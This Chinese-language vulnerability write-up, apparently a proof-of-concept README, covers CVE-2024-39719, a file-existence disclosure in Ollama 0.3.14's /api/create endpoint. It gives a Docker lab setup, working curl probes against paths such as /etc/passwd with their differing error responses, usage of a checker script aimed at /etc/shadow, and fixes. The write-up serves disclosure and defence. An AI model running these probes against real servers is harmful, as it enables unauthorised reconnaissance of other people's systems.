# Ollama 文件存在性泄露漏洞 (CVE-2024-39719) 详细分析

## 漏洞概述

CVE-2024-39719 是一个影响 Ollama 0.3.14 及之前版本的文件存在性泄露（File Existence Disclosure）漏洞。该漏洞允许攻击者通过 API 接口探测服务器上特定文件是否存在，从而可能导致信息泄露。

**发布日期**：2024年10月31日

## 漏洞详情

### 漏洞原理

该漏洞存在于 Ollama 的 `/api/create` 端点中。当攻击者调用 `CreateModel` API 并传递一个路径参数时，服务器会根据该路径是否存在返回不同的错误消息。这种行为使攻击者能够通过分析错误消息来确定服务器上特定文件或目录是否存在。

该漏洞的核心问题是在处理用户输入时没有正确地隐藏路径存在性信息，而是直接将文件系统错误返回给了客户端。

### 影响范围

此漏洞影响 Ollama 0.3.14 及之前的所有版本。

### 漏洞危害

虽然文件存在性泄露漏洞本身可能看起来不太严重，但它可能:

1. 作为更复杂攻击的前置步骤，帮助攻击者收集服务器信息
2. 探测关键配置文件、证书或敏感数据文件的存在
3. 辅助攻击者进行更有针对性的攻击
4. 在特定环境下导致信息泄露，例如确认特定用户的存在或系统特征

## 漏洞复现

### 环境搭建

1. 使用以下 Docker Compose 文件创建受影响的 Ollama 环境：

```yaml
services:
  ollama:
    image: ollama/ollama:0.3.14
    container_name: ollama
    volumes:
      - ollama:/root/.ollama
    ports:
      - "11434:11434"

volumes:
  ollama:
```

2. 启动服务：
```bash
docker compose up -d
```

3. 服务启动后，可通过访问 `http://your-ip:11434/` 确认 Ollama 0.3.14 已成功运行。

### 复现步骤

#### 1. 测试不存在的文件

使用 `curl` 命令发送请求，尝试访问不存在的文件：

```bash
curl "http://your-ip:11434/api/create" -d '{"name": "file-leak-existence","path": "/tmp/non-existing"}'
```

返回结果：
```json
{"error":"error reading modelfile: open /tmp/non-existing: no such file or directory"}
```

#### 2. 测试存在的文件

测试一个存在的文件，例如 `/etc/passwd`：

```bash
curl "http://your-ip:11434/api/create" -d '{"name": "file-leak-existence","path": "/etc/passwd"}'
```

返回结果：
```json
{"error":"no FROM line for the model was specified"}
```

通过以上不同的错误消息，攻击者可以判断目标路径文件是存在还是不存在，从而获取服务器文件结构信息。
需要注意的是，服务器根据不同请求返回的信息可能随着版本不同而不同。

## 漏洞修复

### 官方修复方案

Ollama 官方已在更新版本中修复了该漏洞。修复措施包括：

1. 统一错误处理，避免泄露文件存在性信息
2. 对用户输入的路径进行更严格的验证和过滤
3. 采用更加通用的错误消息，不直接暴露文件系统信息

### 修复建议

1. **升级Ollama版本**：将 Ollama 升级到最新版本是解决此漏洞的最有效方法。
2. **访问控制**：限制对 API 接口的访问，仅允许授权用户使用。
3. **网络隔离**：在可能的情况下，将 Ollama 服务部署在隔离网络中，减少外部访问。
4. **监控**：加强对 API 调用的监控，特别是对 `/api/create` 端点的异常访问模式进行检测。

## 漏洞检测脚本使用方法

提供的 Python 脚本可用于检测 Ollama 服务器是否易受 CVE-2024-39719 漏洞的影响。

### 环境要求
- Python 3.x
- 所需包: `requests`, `termcolor`

### 安装依赖
```bash
pip install requests termcolor
```

### 使用方法
```bash
python CVE_2024_39719.py -u <ollama服务器URL> [-f <要检查的文件>]
```

### 参数选项
- `-u, --url`: Ollama 服务器的 URL（必需）
- `-f, --file`: 要检查是否存在的文件（默认为 "/etc/passwd"）

### 使用示例
```bash
# 检查服务器是否存在漏洞
python CVE_2024_39719.py -u http://your-ip:11434

# 检查特定文件是否存在
python CVE_2024_39719.py -u http://your-ip:11434 -f /etc/shadow
```

## 参考资料

- [国家漏洞库中的 CVE-2024-39719](https://nvd.nist.gov/)
- [Ollama GitHub 仓库](https://github.com/ollama/ollama)
- [Ollama 安全公告](https://github.com/ollama/ollama/security/advisories)

## 免责声明

此脚本仅供教育目的和合法的安全测试使用。在测试任何系统的漏洞之前，请确保您已获得适当的授权。未经授权的测试可能违反法律法规。